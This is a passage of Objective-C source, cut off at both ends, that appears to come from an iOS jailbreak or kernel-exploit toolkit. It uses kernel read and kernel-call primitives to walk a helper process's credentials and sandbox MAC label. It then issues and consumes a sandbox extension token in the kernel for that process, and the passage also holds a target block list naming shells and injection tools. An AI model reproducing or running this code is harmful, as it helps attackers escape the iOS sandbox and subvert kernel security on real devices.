        dt1025_stage(@"build102.6.14 KCALL614_SANDBOX_CHECK_CHANGED_ALLOW");
    } else if (!baseline_allow && !post_allow) {
        dt1025_set_verdict(verdictOut, @"KCALL614_SANDBOX_CHECK_STILL_DENY");
        dt1025_stage(@"build102.6.14 KCALL614_SANDBOX_CHECK_STILL_DENY");
    } else {
        dt1025_set_verdict(verdictOut, @"KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
        dt1025_stage(@"build102.6.14 KCALL614_SEATBELT_ISOLATION_INCONCLUSIVE");
    }

    dt1025_run_614_finish(log, verdictOut);
    dt1025_log(log, @"[*] build102.6.14 verdict=%@ order=preflight_baseline_issue_apply_mirror_consume_post_check mmap=NO amfi_mmap=NO dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static void dt1025_run_619_finish(void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    (void)log;
    (void)verdictOut;
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_NO_ATTACH_NO_CONSUME_NO_SPAWN");
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_BUNDLED_HOLD_ONLY");
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_532930_VIA_CONFIGURED_SLOT_MIRROR");
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_PROFILE_NAME_CONTAINER_REQUIRED");
    dt1025_stage(@"build102.6.21 KCALL619_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.21 KCALL619_DEVICE_RUN_COMPLETE");
}

static int dt1025_run_619_phase1_broker_identity(pid_t app_pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    pid_t broker_pid = -1;

    dt1025_log(log, @"[*] build102.6.27 KCALL619_PHASE1_BROKER_IDENTITY begin app_pid=%d",
        (int)app_pid);
    dt1025_stage(@"build102.6.27 KCALL627_PHASE1_FORMAL_OK_MARKER_TEARDOWN_ORDERING_FIX");
    dt1025_stage(@"build102.6.26 KCALL626_PHASE1_PROFILE_NAME_MIRROR_VALIDATOR_FIX");
    dt1025_stage(@"build102.6.25 KCALL625_PHASE1_HELPER_CONTAINER_PROFILE_ATTACH_DIAGNOSTIC");
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_BROKER_IDENTITY");
    dt1025_stage(@"build102.6.21 KCALL619_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if (!dt1025_helper_entitlements_ok(log)) {
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_HELPER_ENTITLEMENTS");
        dt1025_run_619_finish(log, verdictOut);
        return -10;
    }

    NSString *helperPath = [DTRootHelperClient helperBundledPath];
    if (!helperPath.length || ![[NSFileManager defaultManager] isExecutableFileAtPath:helperPath]) {
        dt1025_log(log, @"[!] build102.6.21 bundled bootstraphelper missing at %@", helperPath ?: @"?");
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_BROKER_DIED");
        dt1025_run_619_finish(log, verdictOut);
        return -11;
    }
    if ([helperPath containsString:@"/var/jb"] || [helperPath containsString:@"dt_helper"]) {
        dt1025_log(log, @"[!] build102.6.21 helper path violates bundled-only rule: %@", helperPath);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_HELPER_ENTITLEMENTS");
        dt1025_run_619_finish(log, verdictOut);
        return -12;
    }

    dt1025_log(log, @"[*] build102.6.21 spawn bundled bootstraphelper hold path=%@", helperPath);
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_BUNDLED_HOLD_ONLY");

    NSString *stdoutCapture = nil;
    NSError *spawnErr = nil;
    int spawn_r = dt_spawn_plain_start(helperPath, @[@"hold"], &broker_pid, &stdoutCapture, &spawnErr);
    if (spawn_r != 0 || broker_pid <= 0) {
        int spawn_errno = spawnErr.code ?: errno;
        dt1025_log(log, @"[!] build102.6.25 bootstraphelper hold spawn failed r=%d pid=%d errno=%d err=%@",
            spawn_r, (int)broker_pid, spawn_errno, spawnErr.localizedDescription ?: @"?");
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        if (spawn_errno == EPERM) {
            dt1025_stage(@"build102.6.25 KCALL624_FAIL_WALL_A_SPAWN");
            dt1025_stage(@"build102.6.25 KCALL624_FAIL_OUTSIDE_CONTAINER");
            dt1025_log(log, @"[!] build102.6.25 spawn EPERM — 54BE48 Wall-A or 54CD50 outside-container hook");
        } else {
            dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_BROKER_DIED");
        }
        dt1025_run_619_finish(log, verdictOut);
        return -13;
    }

    dt1025_log(log, @"[*] build102.6.21 spawn ok broker_pid=%d stdout=%@",
        (int)broker_pid, stdoutCapture ?: @"");

    pid_t parsed_pid = dt1025_parse_helper_pid(stdoutCapture);
    if (parsed_pid > 0 && parsed_pid != broker_pid) {
        dt1025_log(log, @"[!] build102.6.21 stdout parsed pid=%d differs from spawn pid=%d — using spawn pid",
            (int)parsed_pid, (int)broker_pid);
    } else if (parsed_pid <= 0) {
        if (stdoutCapture.length == 0) {
            dt1025_log(log, @"[*] build102.6.21 stdout empty — not identity fail; fallback to spawn pid=%d",
                (int)broker_pid);
            dt1025_stage(@"build102.6.21 KCALL619_PHASE1_STDOUT_PARSE_FALLBACK_SPAWN_PID");
        } else {
            dt1025_log(log, @"[*] build102.6.21 helper_pid parse failed on non-empty stdout — fallback to spawn pid=%d",
                (int)broker_pid);
            dt1025_stage(@"build102.6.21 KCALL619_PHASE1_STDOUT_PARSE_FALLBACK_SPAWN_PID");
        }
    } else {
        dt1025_log(log, @"[*] build102.6.21 helper_pid parse ok parsed=%d spawn=%d",
            (int)parsed_pid, (int)broker_pid);
    }

    if (kill(broker_pid, 0) != 0) {
        dt1025_log(log, @"[!] build102.6.21 broker not alive errno=%d", errno);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_BROKER_DIED");
        dt1025_run_619_finish(log, verdictOut);
        return -16;
    }

    int broker_ppid = dt1025_userspace_ppid(broker_pid);
    dt1025_log(log, @"[*] build102.6.21 broker alive pid=%d ppid=%d app_pid=%d ppid_match=%d",
        (int)broker_pid, broker_ppid, (int)app_pid, broker_ppid == (int)app_pid ? 1 : 0);

    int resolve_attempts = 0;
    int resolve_alive_fail = 0;
    uint64_t proc_kptr = dt1025_broker_proc_resolve(app_pid, broker_pid, log,
        &resolve_attempts, &resolve_alive_fail);

    if (!proc_kptr) {
        dt1025_stop_helper(broker_pid, log);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        if (resolve_alive_fail)
            dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_BROKER_DIED");
        else
            dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_PROC_NOT_FOUND_CONFIRMED_AFTER_RETRIES");
        dt1025_log(log, @"[!] build102.6.23 broker proc_resolve failed after %d attempts alive_fail=%d",
            resolve_attempts, resolve_alive_fail);
        dt1025_run_619_finish(log, verdictOut);
        return -17;
    }

    dt1025_log(log, @"[*] build102.6.23 broker proc_resolve ok attempt=%d proc=0x%llx",
        resolve_attempts, (unsigned long long)proc_kptr);

    uint64_t ucred_kptr = proc_ucred(proc_kptr);
    if (!ucred_kptr) {
        proc_rele(proc_kptr);
        dt1025_stop_helper(broker_pid, log);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_PROC_NOT_FOUND");
        dt1025_run_619_finish(log, verdictOut);
        return -18;
    }

    uint64_t label_kptr = kread_ptr(ucred_kptr + kDTUcredLabelOff);
    if (!label_kptr) {
        proc_rele(proc_kptr);
        dt1025_stop_helper(broker_pid, log);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_LABEL_NULL");
        dt1025_run_619_finish(log, verdictOut);
        return -19;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    int mirror_slot = (int)configured_slot;
    uint64_t slot0_raw = mac_label_get(label_kptr, 0);
    uint64_t profile_resolved = mac_label_get(label_kptr, mirror_slot);

    dt1025_log(log, @"[*] build102.6.25 broker chain proc=0x%llx ucred=0x%llx label=0x%llx",
        (unsigned long long)proc_kptr,
        (unsigned long long)ucred_kptr,
        (unsigned long long)label_kptr);
    dt1025_log(log, @"[*] build102.6.25 configured_slot global=0x%llx slot=%u slot0_raw=0x%llx",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot,
        (unsigned long long)slot0_raw);
    dt1025_log(log, @"[*] build102.6.25 profile_resolved=0x%llx (532930 mirror slot%u)",
        (unsigned long long)profile_resolved, (unsigned)configured_slot);
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_532930_VIA_CONFIGURED_SLOT_MIRROR");

    if (!profile_resolved || profile_resolved == (uint64_t)-1LL) {
        proc_rele(proc_kptr);
        dt1025_stop_helper(broker_pid, log);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_log(log, @"[!] build102.6.25 attach diagnostic: spawn_ok proc_ok label_ok profile_slot_empty (533304 inherit NULL + 54CE54 skip?)");
        dt1025_stage(@"build102.6.25 KCALL624_FAIL_ATTACH_SKIPPED");
        dt1025_stage(@"build102.6.25 KCALL624_FAIL_PROFILE_NULL");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_PROFILE_NULL");
        dt1025_run_619_finish(log, verdictOut);
        return -20;
    }

    dt1025_log(log, @"[*] build102.6.25 attach diagnostic: configured_slot populated (54BE48→5529D4→532A80 path candidate)");

    uint64_t prof_q0 = kread64(profile_resolved + 0x00);
    uint64_t prof_q8 = kread64(profile_resolved + 0x08);
    uint64_t prof_q10 = kread64(profile_resolved + 0x10);
    dt1025_log(log, @"[*] build102.6.21 profile shape ptr=0x%llx +0x00=0x%llx +0x08=0x%llx +0x10=0x%llx",
        (unsigned long long)profile_resolved,
        (unsigned long long)prof_q0,
        (unsigned long long)prof_q8,
        (unsigned long long)prof_q10);

    NSString *profile_name = dt1025_resolve_profile_name(profile_resolved, log);
    dt1025_log(log, @"[*] build102.6.21 profile_name=%@", profile_name ?: @"(null)");
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_PROFILE_NAME_CONTAINER_REQUIRED");

    if (!profile_name || ![profile_name isEqualToString:@"container"]) {
        proc_rele(proc_kptr);
        dt1025_stop_helper(broker_pid, log);
        dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_FAIL");
        dt1025_stage(@"build102.6.26 KCALL619_PHASE1_FAIL_PROFILE_NAME_NOT_CONTAINER");
        dt1025_stage(@"build102.6.25 KCALL619_PHASE1_FAIL_PROFILE_NAME_NOT_CONTAINER");
        dt1025_stage(@"build102.6.21 KCALL619_PHASE1_FAIL_PROFILE_NAME_NOT_CONTAINER");
        dt1025_run_619_finish(log, verdictOut);
        return -21;
    }

    proc_rele(proc_kptr);

    dt1025_set_verdict(verdictOut, @"KCALL619_PHASE1_BROKER_IDENTITY_OK");
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_BROKER_IDENTITY_OK");
    dt1025_log(log, @"[+] build102.6.27 broker identity PASS profile_name=container pid=%d attach=NO spawn=NO",
        (int)broker_pid);

    dt1025_stop_helper(broker_pid, log);
    dt1025_run_619_finish(log, verdictOut);
    return 0;
}

static void dt1025_run_628_phase2_fail_cleanup(pid_t broker_pid, uint64_t broker_proc_kptr,
    void (^log)(NSString *line))
{
    if (broker_proc_kptr)
        proc_rele(broker_proc_kptr);
    if (broker_pid > 0)
        dt1025_stop_helper(broker_pid, log);
}

static void dt1025_run_628_phase2_scope_finish(void (^log)(NSString *line))
{
    (void)log;
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_NO_PHASE3_NO_SPAWN");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_NO_MMAP_NO_DLOPEN_NO_BOOTSTRAP");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_NO_USERSPACE_CONSUME_ON_BROKER");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_SINGLE_CLASS_SINGLE_TOKEN");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_NO_LOADER_LANE_REGRESSION");
}

static int dt1025_run_628_phase2_broker_extension_attach(pid_t app_pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    pid_t broker_pid = -1;
    uint64_t broker_proc_kptr = 0;
    const char *phase2_class = kDTClassExec;
    const char *phase2_path = kDT629Phase2JbPath;

    dt1025_log(log, @"[*] build102.6.29 KCALL628_PHASE2_BROKER_EXTENSION_ATTACH begin app_pid=%d",
        (int)app_pid);
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_BROKER_EXTENSION_ATTACH");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_ATTACH_ONLY_NO_SPAWN");
    dt1025_stage(@"build102.6.27 KCALL627_PHASE1_FORMAL_OK_MARKER_TEARDOWN_ORDERING_FIX");
    dt1025_stage(@"build102.6.21 KCALL619_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if (!dt1025_helper_entitlements_ok(log)) {
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -10;
    }

    NSString *helperPath = [DTRootHelperClient helperBundledPath];
    if (!helperPath.length || ![[NSFileManager defaultManager] isExecutableFileAtPath:helperPath]) {
        dt1025_log(log, @"[!] build102.6.29 bundled bootstraphelper missing at %@", helperPath ?: @"?");
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -11;
    }
    if ([helperPath containsString:@"/var/jb"] || [helperPath containsString:@"dt_helper"]) {
        dt1025_log(log, @"[!] build102.6.29 helper path violates bundled-only rule: %@", helperPath);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -12;
    }

    dt1025_log(log, @"[*] build102.6.29 spawn bundled bootstraphelper hold path=%@", helperPath);
    dt1025_stage(@"build102.6.21 KCALL619_PHASE1_BUNDLED_HOLD_ONLY");

    NSString *stdoutCapture = nil;
    NSError *spawnErr = nil;
    int spawn_r = dt_spawn_plain_start(helperPath, @[@"hold"], &broker_pid, &stdoutCapture, &spawnErr);
    if (spawn_r != 0 || broker_pid <= 0) {
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -13;
    }

    dt1025_log(log, @"[*] build102.6.29 spawn ok broker_pid=%d stdout=%@",
        (int)broker_pid, stdoutCapture ?: @"");

    if (kill(broker_pid, 0) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -16;
    }

    int broker_ppid = dt1025_userspace_ppid(broker_pid);
    BOOL ppid_match = broker_ppid == (int)app_pid;
    dt1025_log(log, @"[*] build102.6.29 broker alive pid=%d ppid=%d app_pid=%d ppid_match=%d",
        (int)broker_pid, broker_ppid, (int)app_pid, ppid_match ? 1 : 0);
    if (!ppid_match) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, 0, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -16;
    }

    int resolve_attempts = 0;
    int resolve_alive_fail = 0;
    broker_proc_kptr = dt1025_broker_proc_resolve(app_pid, broker_pid, log,
        &resolve_attempts, &resolve_alive_fail);
    if (!broker_proc_kptr) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, 0, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -17;
    }

    uint64_t ucred_kptr = proc_ucred(broker_proc_kptr);
    if (!ucred_kptr) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -18;
    }

    uint64_t label_kptr = kread_ptr(ucred_kptr + kDTUcredLabelOff);
    if (!label_kptr) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -19;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    int mirror_slot = (int)configured_slot;
    uint64_t profile_resolved = mac_label_get(label_kptr, mirror_slot);

    dt1025_log(log, @"[*] build102.6.29 broker chain proc=0x%llx ucred=0x%llx label=0x%llx profile=0x%llx slot=%u",
        (unsigned long long)broker_proc_kptr,
        (unsigned long long)ucred_kptr,
        (unsigned long long)label_kptr,
        (unsigned long long)profile_resolved,
        (unsigned)configured_slot);

    if (!profile_resolved || profile_resolved == (uint64_t)-1LL) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -20;
    }

    NSString *profile_name = dt1025_resolve_profile_name(profile_resolved, log);
    dt1025_log(log, @"[*] build102.6.29 profile_name=%@", profile_name ?: @"(null)");
    if (!profile_name || ![profile_name isEqualToString:@"container"]) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_IDENTITY_PREREQ");
        dt1025_run_628_phase2_scope_finish(log);
        return -21;
    }

    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_BROKER_IDENTITY_PREREQ_OK");
    dt1025_log(log, @"[+] build102.6.29 Phase 1 identity precheck PASS broker_pid=%d profile_name=container",
        (int)broker_pid);

    dt1025_plus8_mirror_snap_t mirror_pre = { 0 };
    dt1025_plus8_mirror_snap_t mirror_post = { 0 };
    dt1025_plus8_mirror_read(profile_resolved, phase2_class, &mirror_pre, log, "baseline_pre", NO, NULL);

    char *token = dt1025_issue_token_path(phase2_class, phase2_path, log);
    if (!token) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_TOKEN_ISSUE");
        dt1025_run_628_phase2_scope_finish(log);
        return -30;
    }

    size_t token_len = strlen(token);
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_TOKEN_ISSUE_OK");
    dt1025_log(log, @"[*] build102.6.29 token issued class=%s path=%s token_len=%zu flags=0",
        phase2_class, phase2_path, token_len);

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(broker_proc_kptr, token, log, &consume_kern_ret);
    free(token);

    uint64_t profile_plus8_post = kread64(profile_resolved + 8);
    dt1025_log(log, @"[*] build102.6.29 attach log kern_ret=%d handle_out=%lld token_len=%zu class=%s path=%s broker_profile=0x%llx broker_profile+8=0x%llx",
        consume_kern_ret,
        (long long)handle_out,
        token_len,
        phase2_class,
        phase2_path,
        (unsigned long long)profile_resolved,
        (unsigned long long)profile_plus8_post);

    if (consume_kern_ret != 0) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_55106C_KERN");
        dt1025_run_628_phase2_scope_finish(log);
        return -31;
    }

    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_55106C_ATTACH_OK");

    if (handle_out <= 0) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_HANDLE_ZERO");
        dt1025_run_628_phase2_scope_finish(log);
        return -32;
    }

    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_HANDLE_NONZERO");

    dt1025_plus8_mirror_read(profile_resolved, phase2_class, &mirror_post, log, "mirror_post", YES, phase2_path);

    BOOL s1 = mirror_pre.ext_container == 0 && mirror_post.ext_container != 0;
    BOOL s2 = mirror_pre.bucket_head != mirror_post.bucket_head;
    BOOL s3 = !mirror_pre.class_bucket_present && mirror_post.class_bucket_present;
    BOOL s4 = mirror_post.rec_attached == 1;
    BOOL s5 = mirror_post.handle_count > mirror_pre.handle_count;
    BOOL any_delta = s1 || s2 || s3 || s4 || s5;

    dt1025_log(log, @"[*] build102.6.29 mirror delta S1=%d S2=%d S3=%d S4=%d S5=%d any=%d",
        s1 ? 1 : 0, s2 ? 1 : 0, s3 ? 1 : 0, s4 ? 1 : 0, s5 ? 1 : 0, any_delta ? 1 : 0);
    dt1025_log(log, @"[*] build102.6.29 delta ext_container 0x%llx->0x%llx bucket_head 0x%llx->0x%llx handle_count 0x%llx->0x%llx class_present %d->%d",
        (unsigned long long)mirror_pre.ext_container,
        (unsigned long long)mirror_post.ext_container,
        (unsigned long long)mirror_pre.bucket_head,
        (unsigned long long)mirror_post.bucket_head,
        (unsigned long long)mirror_pre.handle_count,
        (unsigned long long)mirror_post.handle_count,
        mirror_pre.class_bucket_present ? 1 : 0,
        mirror_post.class_bucket_present ? 1 : 0);

    if (!any_delta) {
        dt1025_run_628_phase2_fail_cleanup(broker_pid, broker_proc_kptr, log);
        dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_FAIL");
        dt1025_stage(@"build102.6.29 KCALL628_PHASE2_FAIL_PROFILE_PLUS8_MIRROR");
        dt1025_run_628_phase2_scope_finish(log);
        return -33;
    }

    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_PROFILE_PLUS8_MIRROR_OK");

    dt1025_set_verdict(verdictOut, @"KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_OK");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_BROKER_EXTENSION_ATTACH_OK");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_ATTACH_ONLY_NO_SPAWN");
    dt1025_stage(@"build102.6.29 KCALL628_PHASE2_DEVICE_RUN_COMPLETE");
    dt1025_log(log, @"[+] build102.6.29 Phase 2 attach-only PASS broker_pid=%d handle_out=%lld",
        (int)broker_pid, (long long)handle_out);

    proc_rele(broker_proc_kptr);
    broker_proc_kptr = 0;
    dt1025_stop_helper(broker_pid, log);
    dt1025_run_628_phase2_scope_finish(log);
    return 0;
}

static void dt1025_run_630_phase3_fail_cleanup(pid_t broker_pid, uint64_t broker_proc_kptr,
    int stdout_rd, int cmd_wr, void (^log)(NSString *line))
{
    if (cmd_wr >= 0)
        close(cmd_wr);
    if (stdout_rd >= 0)
        close(stdout_rd);
    if (broker_proc_kptr)
        proc_rele(broker_proc_kptr);
    if (broker_pid > 0)
        dt1025_stop_helper(broker_pid, log);
}

static void dt1025_run_630_phase3_scope_finish(void (^log)(NSString *line))
{
    (void)log;
    dt1025_stage(@"build102.6.30 KCALL630_PHASE3_SPAWN_PROBE_ONLY_NO_EXEC_CHAIN");
    dt1025_stage(@"build102.6.30 KCALL630_NO_MMAP_NO_DLOPEN_NO_BOOTSTRAP");
    dt1025_stage(@"build102.6.30 KCALL630_NO_SHELL_NO_ENV_NO_LOADER");
    dt1025_stage(@"build102.6.30 KCALL630_SINGLE_SPAWN_ATTEMPT_ONLY");
    dt1025_stage(@"build102.6.30 KCALL630_NO_KFD_APP_JBROOT_SPAWN");
}

static int dt1025_run_630_parse_int_field(NSString *text, NSString *key, int defval)
{
    if (text.length == 0)
        return defval;
    NSString *pattern = [NSString stringWithFormat:@"%@=(\\d+)", key];
    NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:pattern
                                                                       options:0
                                                                         error:nil];
    if (!re)
        return defval;
    NSTextCheckingResult *m = [re firstMatchInString:text options:0
                                               range:NSMakeRange(0, text.length)];
    if (!m || m.numberOfRanges < 2)
        return defval;
    return [[text substringWithRange:[m rangeAtIndex:1]] intValue];
}

static NSString *dt1025_run_630_read_broker_out(int stdout_rd, const char *marker, int timeout_ms)
{
    NSMutableData *data = [NSMutableData data];
    char buf[1024];
    int waited = 0;
    while (waited < timeout_ms) {
        struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(stdout_rd, &rfds);
        int sel = select(stdout_rd + 1, &rfds, NULL, NULL, &tv);
        if (sel > 0) {
            ssize_t n = read(stdout_rd, buf, sizeof(buf));
            if (n > 0) {
                [data appendBytes:buf length:(NSUInteger)n];
                if (data.length > 16384)
                    data.length = 16384;
                NSString *partial = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"";
                if ([partial rangeOfString:@(marker)].location != NSNotFound)
                    break;
            } else if (n == 0) {
                break;
            }
        } else if (sel < 0 && errno != EINTR) {
            break;
        }
        waited += 100;
    }
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"";
}

static BOOL dt1025_run_630_target_forbidden(const char *path)
{
    if (!path)
        return YES;
    static const char *const forbidden[] = {
        "bash", "dash", "/sh", "/env", "dpkg", "ldid", "opainject", NULL
    };
    for (int i = 0; forbidden[i]; i++) {
        if (strstr(path, forbidden[i]))
            return YES;
    }
    return NO;
}

static int dt1025_run_631_target_enum(void (^log)(NSString *line))
{
    DIR *dir = opendir(kDT631Phase3UsrBinDir);
    if (!dir) {
        int en = errno;
        dt1025_log(log, @"[*] build102.6.31 KCALL631_TARGET_ENUM opendir path=%s errno=%d",
            kDT631Phase3UsrBinDir, en);
        return -1;
    }

    NSMutableString *entries = [NSMutableString string];
    BOOL found_primary = NO;
    int count = 0;
    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL && count < 64) {
        if (ent->d_name[0] == '.')
            continue;
        if (entries.length)
            [entries appendString:@","];
        [entries appendFormat:@"%s", ent->d_name];
        if (strcmp(ent->d_name, "probe_true") == 0)
            found_primary = YES;
        count++;
    }
    closedir(dir);
    if (count >= 64)
        [entries appendString:@",..."];

    dt1025_log(log, @"[*] build102.6.31 KCALL631_TARGET_ENUM dir=%s count=%d probe_true=%d list=%@",
        kDT631Phase3UsrBinDir, count, found_primary ? 1 : 0, entries);
    dt1025_stage(@"build102.6.31 KCALL631_PHASE3_TARGET_ENUM_OK");
    return 0;
}

static int dt1025_run_630_target_preflight(void (^log)(NSString *line), const char **selected_out)
{
    const char *path = kDT631Phase3PrimaryTarget;
    if (path && path[0] && !dt1025_run_630_target_forbidden(path)) {

        struct stat st = { 0 };
        errno = 0;
        int stat_ret = stat(path, &st);
        int stat_errno = errno;
        dt1025_log(log, @"[*] build102.6.31 KCALL631_TARGET_PREFLIGHT stat path=%s ret=%d size=%lld mode=0%o errno=%d",
            path, stat_ret, (long long)st.st_size, (unsigned)(st.st_mode & 07777), stat_errno);

        if (stat_ret != 0)
            return -1;

        errno = 0;
        int access_ret = access(path, X_OK);
        int access_errno = errno;
        dt1025_log(log, @"[*] build102.6.31 KCALL631_TARGET_PREFLIGHT access path=%s X_OK ret=%d errno=%d",
            path, access_ret, access_errno);

        if (access_ret != 0)
            return -1;

        uint32_t mach_magic = 0;
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            ssize_t rn = read(fd, &mach_magic, sizeof(mach_magic));
            close(fd);
